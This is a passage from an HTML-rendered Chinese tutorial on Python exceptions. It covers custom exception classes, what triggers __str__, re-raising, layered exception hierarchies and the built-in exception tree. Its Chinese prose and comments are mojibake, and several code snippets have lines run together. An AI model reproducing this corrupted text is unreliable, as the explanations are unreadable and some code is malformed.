    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, message: <span class="hljs-built_in">str</span>, status_code: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>):
        <span class="hljs-built_in">super</span>().__init__(message)       <span class="hljs-comment"># è°ƒç”¨çˆ¶ç±»çš„ __init__ æ–¹æ³•</span>
        self.status_code = status_code  <span class="hljs-comment"># ç„¶åå†æ·»åŠ å­ç±»ç‰¹æœ‰å±æ€§</span>
    
    <span class="hljs-comment"># Python ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼ˆé­”æœ¯æ–¹æ³•ï¼‰ï¼Œç”¨äºå®šä¹‰å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚</span>
    <span class="hljs-comment"># å½“éœ€è¦å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼ŒPython ä¼šè‡ªåŠ¨è°ƒç”¨ __str__() æ–¹æ³•ï¼š</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">if</span> self.status_code:        <span class="hljs-comment"># å¤„ç½®çµæ´»</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"APIé”™è¯¯ <span class="hljs-subst">{self.status_code}</span>: <span class="hljs-subst">{self.message}</span>"</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"APIé”™è¯¯: <span class="hljs-subst">{self.message}</span>"</span>

<span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰å¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> APIError(<span class="hljs-string">"ç½‘ç»œè¯·æ±‚å¤±è´¥"</span>, status_code=<span class="hljs-number">500</span>)
<span class="hljs-keyword">except</span> APIError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(e)  <span class="hljs-comment"># APIé”™è¯¯ 500: ç½‘ç»œè¯·æ±‚å¤±è´¥</span>
</code></pre>
<ul>
<li><code>__str__()</code> çš„ 8 ç§è‡ªåŠ¨è§¦å‘æ¡ä»¶
<ul>
<li>æ¡ä»¶1: ä½¿ç”¨ print() å‡½æ•°
<pre><code class="hljs language-python" lang="python">obj = SomeObject()<span class="hljs-built_in">print</span>(obj)  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶2: ä½¿ç”¨ str() æ˜¾å¼è½¬æ¢
<pre><code class="hljs language-python" lang="python">obj = SomeObject()str_obj = <span class="hljs-built_in">str</span>(obj)  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶3: f-string å­—ç¬¦ä¸²æ ¼å¼åŒ–
<pre><code class="hljs language-python" lang="python">obj = SomeObject()message = <span class="hljs-string">f"ç»“æœ: <span class="hljs-subst">{obj}</span>"</span>  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶4: .format() æ–¹æ³•æ ¼å¼åŒ–
<pre><code class="hljs language-python" lang="python">obj = SomeObject()message = <span class="hljs-string">"ç»“æœ: {}"</span>.<span class="hljs-built_in">format</span>(obj)  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶5: % æ ¼å¼åŒ–
<pre><code class="hljs language-python" lang="python">obj = SomeObject()message = <span class="hljs-string">"ç»“æœ: %s"</span> % obj  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶6: å­—ç¬¦ä¸²æ‹¼æ¥ï¼ˆéœ€è¦æ˜¾å¼è½¬æ¢ï¼‰
<pre><code class="hljs language-python" lang="python">obj = SomeObject()message = <span class="hljs-string">"ç»“æœ: "</span> + <span class="hljs-built_in">str</span>(obj)  <span class="hljs-comment"># â† str() è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶7: æ—¥å¿—è®°å½•
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> loggingobj = SomeObject()logging.info(<span class="hljs-string">f"æ—¥å¿—ä¿¡æ¯: <span class="hljs-subst">{obj}</span>"</span>)  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶8: è¿”å›å­—ç¬¦ä¸²çš„å‡½æ•°/æ–¹æ³•ä¸­
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_description</span>(<span class="hljs-params">obj</span>):    <span class="hljs-keyword">return</span> <span class="hljs-string">f"æè¿°: <span class="hljs-subst">{obj}</span>"</span>  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>æ•æ‰å¼‚å¸¸è¿›ä¸€æ­¥å“åº”åï¼ŒæŠ›å‡ºæ•è·çš„å¼‚å¸¸ï¼Œæˆ–å‘ä¸Šä¼ é€’</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-string">"""æ¼”ç¤ºå¼‚å¸¸çš„ä½¿ç”¨å’Œå¤„ç†ã€‚"""</span>
    <span class="hljs-keyword">try</span>:
        current_datetime = datetime.now()        <span class="hljs-comment"># æ¨¡æ‹Ÿä¸šåŠ¡é€»è¾‘</span>
        formatted_datetime = current_datetime.isoformat()
        <span class="hljs-keyword">raise</span> MyError(<span class="hljs-string">"ç³»ç»Ÿå´©æºƒäº†"</span>, <span class="hljs-number">500</span>, formatted_datetime)        <span class="hljs-comment"># æŠ›å‡ºå¼‚å¸¸</span>
    <span class="hljs-keyword">except</span> MyError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ä»£ç : <span class="hljs-subst">{e.error_code}</span>"</span>)    <span class="hljs-comment"># è®°å½•é”™è¯¯ä¿¡æ¯</span>

        <span class="hljs-keyword">raise</span>        <span class="hljs-comment"># å‘ä¸Šä¼ é€’å¼‚å¸¸</span>
        <span class="hljs-comment"># [æˆ–è€…] raise  æ–°å¼‚å¸¸ from åŸå§‹å¼‚å¸¸</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">try</span>:
        main()
    <span class="hljs-keyword">except</span> MyError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næœ€ç»ˆæ•è·çš„é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ä»£ç : <span class="hljs-subst">{e.error_code}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯æ—¶é—´: <span class="hljs-subst">{e.timestamp}</span>"</span>)
</code></pre>
</li>
<li>
<p>è‡ªå®šä¹‰å¼‚å¸¸æŠ›å‡º raise</p>
<ul>
<li>è‡ªå®šä¹‰çš„å¼‚å¸¸ï¼Œraise å¿…é¡»æ˜¾å¼å‡ºç°ã€‚å› ä¸º Python åªèƒ½è‡ªåŠ¨æŠ›å‡ºâ€œå†…ç½®å¼‚å¸¸â€ï¼Œä¸”ä¸çŸ¥é“â€œä¸šåŠ¡é€»è¾‘â€ï¼Œ</li>
<li>è™½ç„¶ raise å¿…é¡»å­˜åœ¨ï¼Œä½†å¯ä»¥è€ƒè™‘åœ¨ ç±»å¤–æˆ–è€… æŠ›å‡ºå¼‚å¸¸ çš„ç±»è‡ªå®šä¹‰è¿‡ç¨‹ä¸­ï¼Œå°†ä¹‹å°è£…åœ¨å‡½æ•°ä¸­ï¼Œç„¶åä¸šåŠ¡ä»£ç éœ€è¦å¤„ç†æŠ›å‡ºæ—¶ç›´æ¥åšå‡½æ•°è°ƒç”¨ï¼Œä»¥æ­¤å®ç° raise æ‰§è¡Œã€‚ä»£ç ç¤ºä¾‹å¦‚ä¸Šè¿° fail_fast() å‡½æ•°ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-20">4.5 å¼‚å¸¸æŠ›å‡ºè‡ªå®šä¹‰çš„ä¼˜åŠ¿</h3>
<ul>
<li>
<p>æ¦‚æ‹¬</p>
<ul>
<li>1ã€ğŸ’¡ è¯­ä¹‰æ¸…æ™°</li>
<li>2ã€ğŸ’¡ æºå¸¦ä¸Šä¸‹æ–‡</li>
<li>3ã€ğŸ’¡ ç²¾ç¡®æ•è·</li>
<li>4ã€ğŸ’¡ åˆ†å±‚å¤„ç†</li>
<li>5ã€ğŸ’¡ APIè®¾è®¡</li>
</ul>
</li>
<li>
<p>ä¼˜åŠ¿1ï¼šè¯­ä¹‰æ›´æ¸…æ™° ğŸ“–</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ ä½¿ç”¨å†…ç½®å¼‚å¸¸ï¼ˆä¸æ¸…æ™°ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"é™¤æ•°ä¸èƒ½ä¸ºé›¶"</span>)  <span class="hljs-comment"># å¤ªæ³›åŒ–</span>

<span class="hljs-comment"># âœ… ä½¿ç”¨è‡ªå®šä¹‰å¼‚å¸¸ï¼ˆæ¸…æ™°ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DivisionByZeroError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""é™¤é›¶é”™è¯¯"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">raise</span> DivisionByZeroError(<span class="hljs-string">f"<span class="hljs-subst">{a}</span> ä¸èƒ½é™¤ä»¥ <span class="hljs-subst">{b}</span>"</span>)  <span class="hljs-comment"># è¯­ä¹‰æ˜ç¡®</span>

<span class="hljs-comment"># ä½¿ç”¨æ—¶</span>
<span class="hljs-keyword">try</span>:
    result = divide(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>)
<span class="hljs-keyword">except</span> DivisionByZeroError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"é™¤é›¶é”™è¯¯ï¼Œè¯·æ£€æŸ¥è¾“å…¥"</span>)  <span class="hljs-comment"># ç²¾ç¡®å¤„ç†</span>
<span class="hljs-keyword">except</span> ValueError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å…¶ä»–å‚æ•°é”™è¯¯"</span>)
</code></pre>
</li>
<li>
<p>ä¼˜åŠ¿2ï¼šæºå¸¦é¢å¤–ä¸Šä¸‹æ–‡ ğŸ’</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼˜åŠ¿ï¼šå†…ç½®å¼‚å¸¸æ— æ³•è¿™æ ·æºå¸¦ç»“æ„åŒ–æ•°æ®ï¼</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolExecutionError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""å·¥å…·æ‰§è¡Œå¼‚å¸¸"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, tool_name: <span class="hljs-built_in">str</span>, error: <span class="hljs-built_in">str</span></span>):
        self.tool_name = tool_name      <span class="hljs-comment"># é¢å¤–ä¿¡æ¯ï¼šå·¥å…·å</span>
        self.error = error              <span class="hljs-comment"># é¢å¤–ä¿¡æ¯ï¼šé”™è¯¯è¯¦æƒ…</span>
        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">f"å·¥å…· '<span class="hljs-subst">{tool_name}</span>' æ‰§è¡Œå¤±è´¥: <span class="hljs-subst">{error}</span>"</span>)

<span class="hljs-comment"># ä½¿ç”¨</span>
<span class="hljs-keyword">try</span>:
    execute_tool(<span class="hljs-string">"add"</span>, {<span class="hljs-string">"a"</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"b"</span>: <span class="hljs-string">"two"</span>})
    <span class="hljs-comment">#  å‡½æ•°ä½“å†…éœ€è¦èƒ½å¤Ÿ raise ToolExecutionErrorï¼Œè‡ªå®šä¹‰ å¼‚å¸¸æŠ›å‡º ä½¿ç”¨æ—¶çš„å‰ç½®æ¡ä»¶</span>
<span class="hljs-keyword">except</span> ToolExecutionError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å·¥å…·: <span class="hljs-subst">{e.tool_name}</span>"</span>)       <span class="hljs-comment"># è®¿é—®é¢å¤–ä¿¡æ¯</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯: <span class="hljs-subst">{e.error}</span>"</span>)
    <span class="hljs-comment"># å¯ä»¥é’ˆå¯¹ä¸åŒå·¥å…·é‡‡å–ä¸åŒæ¢å¤ç­–ç•¥</span>
    <span class="hljs-keyword">if</span> e.tool_name == <span class="hljs-string">"add"</span>:
        retry_with_defaults()
    <span class="hljs-keyword">else</span>:
        log_error()
</code></pre>
</li>
<li>
<p>ä¼˜åŠ¿3ï¼šç²¾ç¡®çš„å¼‚å¸¸æ•è· ğŸ¯</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®šä¹‰å¼‚å¸¸å±‚æ¬¡</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""AgentåŸºç¡€å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""å·¥å…·ç›¸å…³å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""APIç›¸å…³å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""é…ç½®ç›¸å…³å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># ç²¾ç¡®æ•è·</span>
<span class="hljs-keyword">try</span>:
    agent.run()
<span class="hljs-keyword">except</span> ToolError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å·¥å…·é”™è¯¯ï¼Œé‡è¯•..."</span>)
<span class="hljs-keyword">except</span> APIError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"APIé”™è¯¯ï¼Œåˆ‡æ¢å¤‡ç”¨æœåŠ¡å™¨..."</span>)
<span class="hljs-keyword">except</span> ConfigError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"é…ç½®é”™è¯¯ï¼Œè¯·æ£€æŸ¥é…ç½®æ–‡ä»¶"</span>)
<span class="hljs-keyword">except</span> AgentError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å…¶ä»–Agenté”™è¯¯"</span>)
</code></pre>
<ul>
<li>å¯¹æ¯”å†…ç½®å¼‚å¸¸ï¼š
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ æ‰€æœ‰éƒ½å¯èƒ½æ˜¯ValueErrorï¼Œæ— æ³•åŒºåˆ†</span>
<span class="hljs-keyword">try</span>:
    agent.run()
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># è¿™ä¸ªValueErrorå¯èƒ½æ˜¯å·¥å…·é”™è¯¯ã€APIé”™è¯¯æˆ–é…ç½®é”™è¯¯</span>
    <span class="hljs-comment"># æ— æ³•ç²¾ç¡®å¤„ç†ï¼</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å‘ç”Ÿé”™è¯¯:"</span>, e)
</code></pre>
</li>
</ul>
</li>
<li>
<p>ä¼˜åŠ¿4ï¼šåˆ†å±‚å¼‚å¸¸å¤„ç† ğŸ—ï¸</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼˜åŠ¿ï¼šä¸åŒå±‚çœ‹åˆ°ä¸åŒæŠ½è±¡çº§åˆ«çš„å¼‚å¸¸ï¼</span>
<span class="hljs-comment"># æŒ‰å±‚æ¬¡å®šä¹‰å¼‚å¸¸</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""ç”¨æˆ·å±‚å¼‚å¸¸ï¼ˆç›´æ¥å±•ç¤ºç»™ç”¨æˆ·ï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""ä¸šåŠ¡å±‚å¼‚å¸¸ï¼ˆè®°å½•æ—¥å¿—ï¼Œè½¬æ¢ä¸ºUserErrorï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""æ•°æ®å±‚å¼‚å¸¸ï¼ˆè®°å½•è¯¦ç»†æ—¥å¿—ï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># æ•°æ®å±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">save_to_database</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">try</span>:
        db.insert(data)
    <span class="hljs-keyword">except</span> DatabaseError <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> DataError(<span class="hljs-string">f"æ•°æ®åº“æ“ä½œå¤±è´¥: <span class="hljs-subst">{e}</span>"</span>) <span class="hljs-keyword">from</span> e

<span class="hljs-comment"># ä¸šåŠ¡å±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_user_order</span>(<span class="hljs-params">order</span>):
    <span class="hljs-keyword">try</span>:
        save_to_database(order)
        send_notification(order)
    <span class="hljs-keyword">except</span> DataError <span class="hljs-keyword">as</span> e:
        log_error(e)  <span class="hljs-comment"># è®°å½•æŠ€æœ¯ç»†èŠ‚</span>
        <span class="hljs-keyword">raise</span> UserError(<span class="hljs-string">"è®¢å•å¤„ç†å¤±è´¥ï¼Œè¯·è”ç³»å®¢æœ"</span>) <span class="hljs-keyword">from</span> e  <span class="hljs-comment"># è½¬æ¢ä¸ºç”¨æˆ·å‹å¥½çš„å¼‚å¸¸</span>

<span class="hljs-comment"># ç”¨æˆ·å±‚ï¼ˆå±•ç¤ºç»™ç”¨æˆ·ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>():
    <span class="hljs-keyword">try</span>:
        process_user_order(order_data)
    <span class="hljs-keyword">except</span> UserError <span class="hljs-keyword">as</span> e:
        show_error_message(<span class="hljs-built_in">str</span>(e))  <span class="hljs-comment"># æ˜¾ç¤ºå‹å¥½ä¿¡æ¯</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        log_error(e)
        show_error_message(<span class="hljs-string">"ç³»ç»Ÿé”™è¯¯ï¼Œè¯·ç¨åé‡è¯•"</span>)
</code></pre>
</li>
<li>
<p>ä¼˜åŠ¿5ï¼šæ¡†æ¶/åº“çš„APIè®¾è®¡ ğŸ“š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼˜åŠ¿ï¼šåº“ä½¿ç”¨è€…å¯ä»¥ç²¾ç¡®åŒºåˆ†ä¸åŒé”™è¯¯ç±»å‹ï¼</span>
<span class="hljs-comment"># ä½œä¸ºä¸€ä¸ªåº“ä½œè€…ï¼Œæä¾›æ¸…æ™°çš„å¼‚å¸¸æ¥å£</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProcessor</span>:
    <span class="hljs-string">"""æ•°æ®å¤„ç†åº“"""</span>
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataFormatError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
        <span class="hljs-string">"""æ•°æ®æ ¼å¼é”™è¯¯"""</span>
        <span class="hljs-keyword">pass</span>
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValidationError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
        <span class="hljs-string">"""æ•°æ®éªŒè¯é”™è¯¯"""</span>
        <span class="hljs-keyword">pass</span>
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessingError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
        <span class="hljs-string">"""å¤„ç†è¿‡ç¨‹é”™è¯¯"""</span>
        <span class="hljs-keyword">pass</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">self, data</span>):
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._validate_format(data):
            <span class="hljs-keyword">raise</span> DataFormatError(<span class="hljs-string">"æ•°æ®æ ¼å¼ä¸æ­£ç¡®"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._validate_content(data):
            <span class="hljs-keyword">raise</span> ValidationError(<span class="hljs-string">"æ•°æ®å†…å®¹ä¸ç¬¦åˆè¦æ±‚"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._process_data(data):
            <span class="hljs-keyword">raise</span> ProcessingError(<span class="hljs-string">"å¤„ç†è¿‡ç¨‹å¤±è´¥"</span>)

<span class="hljs-comment"># åº“ä½¿ç”¨è€…</span>
processor = DataProcessor()
<span class="hljs-keyword">try</span>:
    processor.process(user_data)
<span class="hljs-keyword">except</span> DataFormatError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¯·æä¾›æ­£ç¡®æ ¼å¼çš„æ•°æ®"</span>)
<span class="hljs-keyword">except</span> ValidationError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ•°æ®å†…å®¹æœ‰è¯¯"</span>)
<span class="hljs-keyword">except</span> ProcessingError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¤„ç†å¤±è´¥ï¼Œè¯·é‡è¯•"</span>)
</code></pre>
</li>
</ul>
<h3 data-id="heading-21">4.6 å®é™…å¯¹æ¯”ç¤ºä¾‹ï¼Œåœºæ™¯ä¸º ä¸€ä¸ªç®€å•çš„ç”¨æˆ·æ³¨å†ŒåŠŸèƒ½ï¼Œ</h3>
<ul>
<li>
<p>æ–¹å¼2æ›´æ¸…æ™°ã€æ›´æ˜“ç»´æŠ¤</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ========== æ–¹å¼1ï¼šåªç”¨å†…ç½®å¼‚å¸¸ ==========</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">register_user</span>(<span class="hljs-params">username, email, password</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"ç”¨æˆ·åä¸èƒ½ä¸ºç©º"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'@'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> email:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"é‚®ç®±æ ¼å¼é”™è¯¯"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(password) &lt; <span class="hljs-number">8</span>:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"å¯†ç é•¿åº¦ä¸è¶³"</span>)
    <span class="hljs-comment"># ... æ³¨å†Œé€»è¾‘</span>

<span class="hljs-comment"># ä½¿ç”¨æ—¶</span>
<span class="hljs-keyword">try</span>:
    register_user(<span class="hljs-string">""</span>, <span class="hljs-string">"invalid"</span>, <span class="hljs-string">"short"</span>)
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># æ‰€æœ‰é”™è¯¯éƒ½æ˜¯ValueErrorï¼Œæ— æ³•åŒºåˆ†</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ³¨å†Œå¤±è´¥:"</span>, e)
    <span class="hljs-comment"># å¦‚ä½•çŸ¥é“æ˜¯å“ªä¸ªå­—æ®µé”™äº†ï¼Ÿéœ€è¦è§£æå­—ç¬¦ä¸²ï¼Œå¾ˆè„†å¼±ï¼</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ========== æ–¹å¼2ï¼šä½¿ç”¨è‡ªå®šä¹‰å¼‚å¸¸ ==========</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RegistrationError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""æ³¨å†Œå¼‚å¸¸åŸºç±»"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UsernameError</span>(<span class="hljs-title class_ inherited__">RegistrationError</span>):
    <span class="hljs-string">"""ç”¨æˆ·åé”™è¯¯"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailError</span>(<span class="hljs-title class_ inherited__">RegistrationError</span>):
    <span class="hljs-string">"""é‚®ç®±é”™è¯¯"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordError</span>(<span class="hljs-title class_ inherited__">RegistrationError</span>):
    <span class="hljs-string">"""å¯†ç é”™è¯¯"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">register_user</span>(<span class="hljs-params">username, email, password</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:
        <span class="hljs-keyword">raise</span> UsernameError(<span class="hljs-string">"ç”¨æˆ·åä¸èƒ½ä¸ºç©º"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'@'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> email:
        <span class="hljs-keyword">raise</span> EmailError(<span class="hljs-string">"é‚®ç®±æ ¼å¼é”™è¯¯"</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(password) &lt; <span class="hljs-number">8</span>:
        <span class="hljs-keyword">raise</span> PasswordError(<span class="hljs-string">"å¯†ç é•¿åº¦ä¸è¶³"</span>)
    <span class="hljs-comment"># ... æ³¨å†Œé€»è¾‘</span>

<span class="hljs-comment"># ä½¿ç”¨æ—¶</span>
<span class="hljs-keyword">try</span>:
    register_user(<span class="hljs-string">""</span>, <span class="hljs-string">"invalid"</span>, <span class="hljs-string">"short"</span>)
<span class="hljs-keyword">except</span> UsernameError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¯·è¾“å…¥ç”¨æˆ·å"</span>)
<span class="hljs-keyword">except</span> EmailError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„é‚®ç®±åœ°å€"</span>)
<span class="hljs-keyword">except</span> PasswordError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¯†ç é•¿åº¦è‡³å°‘8ä½"</span>)
<span class="hljs-keyword">except</span> RegistrationError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ³¨å†Œå¤±è´¥ï¼Œè¯·æ£€æŸ¥è¾“å…¥"</span>)
</code></pre>
</li>
</ul>
<h2 data-id="heading-22">5ã€Python å†…ç½® å¼‚å¸¸æŠ›å‡º</h2>
<ul>
<li>Pythonä¸­çš„<strong>try-except</strong>è¯­å¥å¯ä»¥æ•è·<strong>ä»»ä½•</strong>ç»§æ‰¿<strong>è‡ªBaseExceptionçš„å¼‚å¸¸</strong>ã€‚</li>
</ul>
<h3 data-id="heading-23">5.1 python å†…ç½®çš„å¼‚å¸¸ å±‚æ¬¡ç»“æ„</h3>
<ul>
<li>
<p>å››å¤§ç³»ç»Ÿçº§å¼‚å¸¸ (ç›´æ¥ç»§æ‰¿BaseException)</p>
<pre><code class="hljs language-python" lang="python">å¼‚å¸¸ç±»å‹	          è§¦å‘åœºæ™¯	            ä»£ç è®¾è®¡å»ºè®®æ•è·	            åŸå› 
Exception        æ‰€æœ‰å¸¸è§„å¼‚å¸¸çš„çˆ¶ç±»        å…¶å­ç±» âœ… åº”è¯¥	   å¸¸è§„ç¨‹åºé”™è¯¯ï¼Œåº”è¯¥å¤„ç†
KeyboardInterrupt	ç”¨æˆ·æŒ‰ Ctrl+C	        âš ï¸ è°¨æ…	           ä»…ç”¨äºæ¸…ç†èµ„æºï¼Œä¸è¦å®Œå…¨å¿½ç•¥
SystemExit	        sys.exit() è°ƒç”¨	        âŒ ä¸å»ºè®®	      è®©ç¨‹åºæ­£å¸¸é€€å‡ºï¼Œé™¤éæœ‰ç‰¹æ®Šéœ€æ±‚
GeneratorExit	    ç”Ÿæˆå™¨å…³é—­	            âŒ ä¸éœ€è¦	      ç”Ÿæˆå™¨å†…éƒ¨é€šå¸¸ä¸éœ€è¦å¤„ç†
</code></pre>
</li>
<li>
<p>ç®€åŒ–ç»“æ„</p>
<pre><code class="hljs language-python" lang="python">BaseException
â”œâ”€â”€ SystemExit
â”œâ”€â”€ KeyboardInterrupt
â”œâ”€â”€ GeneratorExit
â”œâ”€â”€ Exception
    â”œâ”€â”€ StopIteration
